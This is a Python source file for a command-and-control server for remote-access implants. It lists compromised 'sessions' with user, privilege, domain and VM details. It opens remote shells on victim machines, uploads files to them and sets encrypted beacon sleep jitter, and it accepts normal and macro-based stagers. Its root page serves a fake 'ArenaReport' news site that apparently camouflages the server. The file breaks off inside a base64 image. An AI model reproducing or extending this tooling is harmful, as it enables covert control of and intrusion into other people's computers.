import os, threading, multiprocessing, argparse, uvicorn
from signal import SIGILL
from time import sleep
from datetime import datetime, date
from tqdm import tqdm
from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.shortcuts import button_dialog, yes_no_dialog, message_dialog
from tabulate import tabulate
from contextlib import asynccontextmanager
from fastapi import FastAPI, Request, Response
from fastapi.responses import HTMLResponse, StreamingResponse
from uvicorn.config import LOGGING_CONFIG
from contextlib import suppress

from packages.consts import FILE_MESSAGE_SIZE, logo, manual_general, manual_interact, additional_notes, sessions_header_verbose, prompt_style, DEFAULT_GREETING_BUF, STAGER_GREETING_BUF_NORMAL, STAGER_GREETING_BUF_MACRO, VALIDATION_HEADER_SIZE, GREETING_SIZE, STAGER_AES_KEY, SATGER_IV, str_mappers, pretty_tabulate
from packages.utill import line_info, encode_m, decode_m, convert_seconds, zero_remover, add_command, get_command, clear_pipe, Address, get_ip_port, get_min_and_max_sleep_time, log_and_print as print
from packages.encryption import encrypt_AES, decrypt_AES
from packages.db import handle_db, load_sessions, add_session, update_session_exists, update_session_sleep_time, load_common_vars, update_common_vars, update_common_vars_active_session, update_session_processor, update_common_vars_sessions_num
from packages import vars

from pathlib import Path

history = InMemoryHistory()
# history = FileHistory('packages/history/inputs/keyboard_history.txt')
# cmd_history = FileHistory('packages/history/inputs/cmd_history.txt')
# dialog_history = FileHistory('packages/history/inputs/dialog_history.txt')
# exes_history = FileHistory('packages/history/inputs/exes_history.txt')

@asynccontextmanager
async def thread_runner(app: FastAPI):
    threading.Thread(target=shell_handler).start()
    threading.Thread(target=mainUI_communicate).start()
    yield
app = FastAPI(lifespan=thread_runner)

def shell_handler():
    while True:
        vars.shell_handler_event.wait()
        a_cmd = vars.active_command
        if a_cmd == "":
            # if vars.active_exe_id == 0:
            add_command(vars.active_session, str_mappers.shell_result)
            # else:
                # exe_identifier = (1 if vars.sessions[vars.active_session]['exes'][vars.active_exe_id]['type'] == 'On Disk' else 0).to_bytes(4, byteorder='little') + (vars.sessions[vars.active_session]['exes'][vars.active_exe_id]['pid']).to_bytes(4, byteorder='little')
                # add_command(vars.active_session, str_mappers.shell_result_exe + exe_identifier)
        else:
            # if vars.active_exe_id == 0:
            add_command(vars.active_session, str_mappers.exec_command + encode_m(a_cmd))
            # else:
            #     exe_identifier = (1 if vars.sessions[vars.active_session]['exes'][vars.active_exe_id]['type'] == 'On Disk' else 0).to_bytes(4, byteorder='little') + (vars.sessions[vars.active_session]['exes'][vars.active_exe_id]['pid']).to_bytes(4, byteorder='little')
            #     add_command(vars.active_session, str_mappers.exec_command_exe + exe_identifier + encode_m(a_cmd))
            vars.old_active_command = a_cmd
            vars.active_command = ""
        sleep(1)

def keyboard_interrupt_handler(f):
    def func():
        try:
            f()
        except KeyboardInterrupt:
            print("good bye!", color='green')
            if hasattr(vars, 'logFile'):
                vars.logFile.close()
            process = multiprocessing.current_process()
            os.kill(process.pid, SIGILL)
        except Exception as e:
            print("exception in mainUI_communicate: ", e, color='red')
    return func

@keyboard_interrupt_handler
def mainUI_communicate():
    while True:
        # inpstr = "general command-> " if vars.active_session == 0 else "interact " + str(vars.active_session) + '--' + str(vars.sessions[vars.active_session]["client_address"][0]) + "@" + str(vars.sessions[vars.active_session]["user"]) + f"{" (Admin)" if vars.sessions[vars.active_session]["isAdmin"] else " (System)" if vars.sessions[vars.active_session]["isSystem"] else ""}" + " -> "
        if vars.active_session == 0:
            colored_inpstr = [('class:normal', "general command-> ")]
        else:
            colored_inpstr = [('class:normal', "interact "), ('class:at', str(vars.active_session) + '--'), ('class:ip', str(vars.sessions[vars.active_session]["client_address"][0])), ('class:normal', "@"), ('class:user', vars.sessions[vars.active_session]["user"]), ('class:at', f"{" (Admin)" if vars.sessions[vars.active_session]["isAdmin"] else " (System)" if vars.sessions[vars.active_session]["isSystem"] else ""}"), ('class:normal', " -> ")]
        with patch_stdout():
            inp = prompt(colored_inpstr, history=history, style=prompt_style)
        # if vars.startDay != date.today():
        #     vars.startDay = date.today()
        #     vars.logFile.close()
        #     vars.logFile = open(f'packages/history/logs/Log-{vars.startDay}.txt', 'a', encoding='utf-8')
        # vars.logFile.write(inpstr + inp + '\n')
        # vars.logFile.flush()
        
        command = inp.split(" ", 1)

        if command[0] == "s":
            sessions_table = []
            sessions_elapsed_seconds = []
            for id, session in vars.sessions.items():
                elapsed_seconds = int((datetime.now() - session["last_check_time"]).total_seconds())
                try:
                    sessions_table.append([str(id), str(session["client_address"][0]) + ' : ' + str(session["client_address"][1]), str(session["user"]) + f"{" (Admin)" if session["isAdmin"] else " (System)" if session["isSystem"] else ""}", 
                    str(session["computerName"]), str(session["domain"]) if session["isDomain"] else "-", session["osVersion"], "yes" if session["isVM"] else "no",
                    str(convert_seconds(elapsed_seconds)), str(get_min_and_max_sleep_time(session["sleep_time"])) + " seconds", session["create_time"].strftime("%Y-%m-%d %H:%M:%S"), str(session["mid"])])
                except:
                    sessions_table.append([str(id), '--', '--', '--', '--', '--', '--', str(convert_seconds(elapsed_seconds)), '--', '--', str(session["mid"])])
                sessions_elapsed_seconds.append(elapsed_seconds)
            
            if len(sessions_table) > 0:
                sessions_list = pretty_tabulate(
                    sessions_table,
                    headers=sessions_header_verbose,
                    stralign='center',
                    numalign='center',
                    enable_ansi=True,
                    zebra=False,
                    highlight_columns=[0, 1, 2],
                    row_dim_fn=lambda _row, row_i: sessions_elapsed_seconds[row_i] > 2 * 24 * 60 * 60,
                    cell_color_fn=lambda _row, row_i, col_i, _cell: (
                        "92" if col_i == 7 and sessions_elapsed_seconds[row_i] < 2 * 60 * 60
                        else "91" if col_i == 7 and sessions_elapsed_seconds[row_i] <= 2 * 24 * 60 * 60
                        else None
                    ),
                )
                print(sessions_list)
            else:
                print("no client connected yet.", color='light_magenta')

        elif command[0] == "h":
            print('the server is running for ' + str(convert_seconds(int((datetime.now() -  vars.startTime).total_seconds()))) + ' on ' + str(vars.SERVER_IP) + ' : ' + str(vars.SERVER_PORT), color='green')
            if len(command) == 2 and command[1] == "-v":
                print(additional_notes, color='light_cyan')
            else:
                print(manual_general if vars.active_session == 0 else manual_interact, color='light_cyan')

        elif command[0] == "i":
            if len(command) == 1:
                print("no session id entered", color='red')
                continue
            try:
                id = int(command[1])
            except:
                print("invald session id", color='red')
                continue
            if vars.sessions.get(id) == None:
                print("invalid session id", color='red')
            else:
                vars.active_session = id
                update_common_vars_active_session()

        elif command[0] == "c" and vars.active_session != 0:
            add_command(vars.active_session, str_mappers.check)

        elif command[0] == "sleep" and vars.active_session != 0:
            if len(command) == 1:
                print("no time entered", color='red')
                continue
            amounts = command[1].split(' ')
            if len(amounts) == 1:
                print("only one time entered", color='red')
                continue
            try:
                min = int(amounts[0])
            except:
                print("invalid min time, it must be an integer in seconds, between 1 and 2592000 (1 second to 1 month).", color='red')
                continue
            if min < 1 or min > 2592000:
                print("invalid min time, it must be an integer in seconds, between 1 and 2592000 (1 second to 1 month).", color='red')
                continue
            try:
                max = int(amounts[1])
            except:
                print("invalid max time, it must be an integer in seconds, between 1 and 2592000 (1 second to 1 month).", color='red')
                continue
            if max < 1 or max > 2592000:
                print("invalid max time, it must be an integer in seconds, between 1 and 2592000 (1 second to 1 month).", color='red')
                continue
            if min > max:
                print("invalid time, min must be lesser than max!", color='red')
                continue
            base = int((min + max) / 2)
            tolerance = max - base
            sleep_amount = str(base) + ' ± ' + str(tolerance)
            add_command(vars.active_session, str_mappers.set_sleep + base.to_bytes(4, byteorder="little") + tolerance.to_bytes(4, byteorder="little"))
            vars.sessions[vars.active_session]["sleep_time"] = sleep_amount
            update_session_sleep_time(sleep_amount)

        elif command[0] == "shell" and vars.active_session != 0:
            vars.active_command, vars.old_active_command = "", ""
            vars.shell_creation_success.clear()
            add_command(vars.active_session, str_mappers.create_shell)
            if not vars.shell_creation_success.wait(get_min_and_max_sleep_time(vars.sessions[vars.active_session]["sleep_time"])[1] + 10):
                print("failed to create cmd in client / timeout", color='red')
                clear_pipe(vars.active_session)
                continue
            # vars.active_exe_id = 0
            vars.shell_handler_event.set()
            vars.shell_creation_success.clear()
            firstT = True
            try:
                while True:
                    sleep(1.5 if vars.active_command != "" or firstT else 0)
                    firstT = False
                    with patch_stdout():
                        cmd = prompt([('class:at', '\n> ')], style=prompt_style, history=history, complete_while_typing=True)
                    vars.active_command = cmd
                    vars.logFile.write('\n> ' + cmd + '\n')
                    vars.logFile.flush()
            except KeyboardInterrupt:
                vars.shell_handler_event.clear()
                clear_pipe(vars.active_session)
                add_command(vars.active_session, str_mappers.exit_shell)

        elif command[0] == "u" and vars.active_session != 0:
            if len(command) == 1:
                print('no path entered.', color='red')
                continue

            paths = command[1].strip('\"').split('\" -> \"')
            if len(paths) == 1:
                print('only one path entered.', color='red')
                continue

            try:
                local_file = open(os.path.expandvars(paths[0]), 'rb')
            except:
                print("invalid path in local system.", color='red')
                continue

            pos = local_file.tell()
            local_file.seek(0, os.SEEK_END)
            file_size = local_file.tell()
            local_file.seek(pos)

            number_of_packets = int(file_size / FILE_MESSAGE_SIZE)
            if file_size % FILE_MESSAGE_SIZE != 0 : 
                number_of_packets += 1

            add_command(vars.active_session, str_mappers.upload + number_of_packets.to_bytes(4, byteorder="little") + encode_m(paths[1]) + b"\x00")

            if not vars.upload_start_success.wait(get_min_and_max_sleep_time(vars.sessions[vars.active_session]["sleep_time"])[1] + 10):
                print("invalid path in victim system / timeout.", color='red')
                clear_pipe(vars.active_session)
                local_file.close()
                continue
            vars.upload_start_success.clear()
            
            print(f'Uploading {paths[0]}', color='green')
            for i in tqdm(range(number_of_packets)):
                add_command(vars.active_session, str_mappers.filedata + local_file.read(FILE_MESSAGE_SIZE))
                if not vars.upload_index_success.wait(10):
                    print("upload failed / timeout.", color='red')
                    clear_pipe(vars.active_session)
                    break
                vars.upload_index_success.clear()
            local_file.close()

        elif command[0] == "esc" and vars.active_session != 0:
            vars.active_session = 0
            update_common_vars_active_session()
        else:
            print("invalid command", color='red')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', default=0, help='the port for the server to run on. default is 80.', required=False, type=int)
    parser.add_argument('-ip', '--ip', default='', help='the ip for the server to run on. if you dont specify the ip and no ip is stored in database, the code will get the system public ip from ipify.', required=False, type=str)
    parser.add_argument('-cdb', '--clearDB', default=False, help='clear the database. use this to remove old sessions and old config (ip, port, ...)', required=False, action='store_true')
    # parser.add_argument('-b', '--backups', default='', help='file containing the backup servers address in ip:port format. the first 19 lines will be applied.', required=False, type=str)
    arguments = parser.parse_args()
    print(logo, color='yellow')
    print(manual_general, color='light_cyan')
    handle_db(arguments.clearDB)
    load_common_vars()
    load_sessions()
    vars.SERVER_IP, vars.SERVER_PORT = get_ip_port(arguments.ip, arguments.port)
    update_common_vars()
    # ips, ports = get_backup_servers(arguments.backups, vars.SERVER_IP.encode(), vars.SERVER_PORT)
    # modify_client_exe(ips, ports)
    try:
        LOGGING_CONFIG["formatters"]["access"]["fmt"] = '%(levelprefix)s %(asctime)s - %(client_addr)s - "%(request_line)s" %(status_code)s'
        uvicorn.run('main:app', host=vars.SERVER_IP, port=vars.SERVER_PORT, log_level='critical') # [critical|error|warning|info|debug|trace]
    except Exception as e:
        print("exception in fastapi:", e, color='red')

def show_bingo_processor(is_bingo):
    def show_bingo_processor_decorator(func):
        async def request_processor(request: Request):
            try:
                enc_data: bytes = await request.body()
                data: bytes = decrypt_AES(enc_data) if is_bingo else decrypt_AES(enc_data, STAGER_AES_KEY, SATGER_IV)
                greeting = data[VALIDATION_HEADER_SIZE - GREETING_SIZE : VALIDATION_HEADER_SIZE]
                if (is_bingo and greeting == DEFAULT_GREETING_BUF) or (not is_bingo and (greeting == STAGER_GREETING_BUF_NORMAL or greeting == STAGER_GREETING_BUF_MACRO)):
                    res_data, status_code = await func(data[VALIDATION_HEADER_SIZE : ], request.client, greeting == STAGER_GREETING_BUF_NORMAL)
                    return Response(content=encrypt_AES(res_data) if is_bingo else encrypt_AES(res_data, STAGER_AES_KEY, SATGER_IV), media_type='multipart/byteranges', status_code=status_code)
            except Exception as e:
                print('exception in show_bingo_request_processor', e)
            print('invalid request to', str(request.url), 'from', request.client, 'at', datetime.now())
            return Response(content=str_mappers.no_str, media_type='multipart/byteranges', status_code=400)
        return request_processor
    return show_bingo_processor_decorator

def processor(func):
    async def request_processor(request: Request):
        sid = "--"
        try:
            enc_data: bytes = await request.body()
            data: bytes = decrypt_AES(enc_data)
            sid = int.from_bytes(data[7:11], byteorder='little')
            mid = int.from_bytes(data[11:15], byteorder='little')
            if vars.sessions.get(sid) and data[VALIDATION_HEADER_SIZE - GREETING_SIZE : VALIDATION_HEADER_SIZE] == vars.sessions[sid]['greeting'] and vars.sessions[sid]['mid'] == mid:
                res_data, status_code = await func(sid, data[VALIDATION_HEADER_SIZE : ], request.client)
                vars.sessions[sid]['mid'] += 1
                vars.sessions[sid]["last_check_time"] = datetime.now()
                update_session_processor(sid, vars.sessions[sid])
                res_data_with_len = len(res_data).to_bytes(4, byteorder='little') + res_data
                return Response(content=encrypt_AES(res_data_with_len), media_type='multipart/byteranges', status_code=status_code)
        except Exception as e:
            print('exception in request_processor', e)
        print('invalid request to', str(request.url), 'from', request.client, "client", sid)
        return Response(content=str_mappers.no_str, media_type='multipart/byteranges', status_code=400)
    return request_processor


@app.get("/", response_class=HTMLResponse)
async def home():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>About Us | ArenaReport</title>

        <style>
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');

            body {
                font-family: 'Poppins', sans-serif;
                margin: 0;
                padding: 0;
                color: #fff;
                scroll-behavior: smooth;
                background-color: #0d0d0d;
            }
            #vanta-bg {
                position: absolute;
                width: 100%;
                height: 100%;
                z-index: -1;
            }
            .content {
                position: relative;
                z-index: 1;
            }
            nav {
                position: fixed;
                top: 0;
                width: 100%;
                background-color: rgba(0, 0, 0, 0.7);
                padding: 15px 30px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                z-index: 2;
            }
            nav h1 {
                margin: 0;
                font-size: 20px;
                color: #fff;
            }
            nav ul {
                list-style: none;
                display: flex;
                gap: 20px;
                margin: 0;
                padding: 0;
            }
            nav ul li a {
                color: #fff;
                text-decoration: none;
                font-weight: bold;
                transition: color 0.3s;
            }
            nav ul li a:hover {
                color: #ffcc00;
            }
            header {
                text-align: center;
                padding: 120px 20px 60px;
                animation: fadeInDown 1s ease-out;
            }
            section {
                max-width: 1000px;
                margin: 40px auto;
                background-color: rgba(0,0,0,0.6);
                padding: 40px;
                border-radius: 10px;
                animation: fadeInUp 1s ease-out;
            }
            h2 {
                color: #ffcc00;
                margin-top: 40px;
            }
            p {
                line-height: 1.8;
                text-align: justify;
            }
            .gallery {
                display: flex;
                gap: 20px;
                flex-wrap: wrap;
                margin-top: 30px;
                justify-content: center;
            }
            .gallery img {
                width: 300px;
                height: auto;
                border-radius: 10px;
                box-shadow: 0 0 5px rgba(255,255,255,0.3);
                transition: transform 0.3s ease;
            }
            .gallery img:hover {
                transform: scale(1.05);
            }
            footer {
                background-color: rgba(0,0,0,0.8);
                color: white;
                text-align: center;
                padding: 30px;
                margin-top: 60px;
            }
            footer img {
                width: 100px;
                margin-bottom: 10px;
                border-radius: 8px;
            }
            @keyframes fadeInDown {
                from { opacity: 0; transform: translateY(-30px); }
                to { opacity: 1; transform: translateY(0); }
            }
            @keyframes fadeInUp {
                from { opacity: 0; transform: translateY(30px); }
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
    </head>
    <body id="vanta-bg">
    <div class="content">

        <nav>
            <h1>ArenaReport</h1>

            <ul>
                <li><a href="#english">English</a></li>
                <li><a href="#french">Français</a></li>
                <li><a href="#german">Deutsch</a></li>
            </ul>
        </nav>

        <header>
            <h1>About ArenaReport</h1>
            <p>Real-Time News & Insightful Reports</p>

        </header>

        <section>
            <h2 id="english">English</h2>
            <p>
                ArenaReport is your trusted source for timely news, in-depth reports, and expert analysis.
                We cover global events, politics, technology, sports, and culture with clarity and integrity.
                Our mission is to empower readers with accurate information and diverse perspectives.
                Whether you're tracking breaking news or exploring investigative features, we deliver content that matters.
                Our editorial team works around the clock to ensure transparency, relevance, and journalistic excellence.
                Join us in navigating the world through facts, not noise.
                ArenaReport—where information meets insight.
            </p>

            <h2 id="french">Français</h2>
            <p>
                ArenaReport est votre source fiable pour des nouvelles en temps réel, des rapports approfondis et des analyses expertes.
                Nous couvrons les événements mondiaux, la politique, la technologie, le sport et la culture avec clarté et intégrité.
                Notre mission est d'informer les lecteurs avec précision et diversité.
                Que vous suiviez l'actualité ou exploriez des enquêtes, nous vous offrons un contenu pertinent.
                Notre équipe éditoriale travaille sans relâche pour garantir la transparence et l'excellence journalistique.
                ArenaReport—là où l'information rencontre la réflexion.
            </p>

            <h2 id="german">Deutsch</h2>
            <p>
                ArenaReport ist Ihre zuverlässige Quelle für aktuelle Nachrichten, tiefgehende Berichte und fundierte Analysen.
                Wir berichten über globale Ereignisse, Politik, Technologie, Sport und Kultur mit Klarheit und Integrität.
                Unsere Mission ist es, Leser mit präzisen Informationen und vielfältigen Perspektiven zu stärken.
                Ob aktuelle Schlagzeilen oder investigative Recherchen—wir liefern Inhalte mit Bedeutung.
                Unser Redaktionsteam arbeitet rund um die Uhr für Transparenz und journalistische Qualität.
                ArenaReport—wo Information auf Erkenntnis trifft.
            </p>


            <div class="gallery">
                <img src="data:image/jpeg;base64,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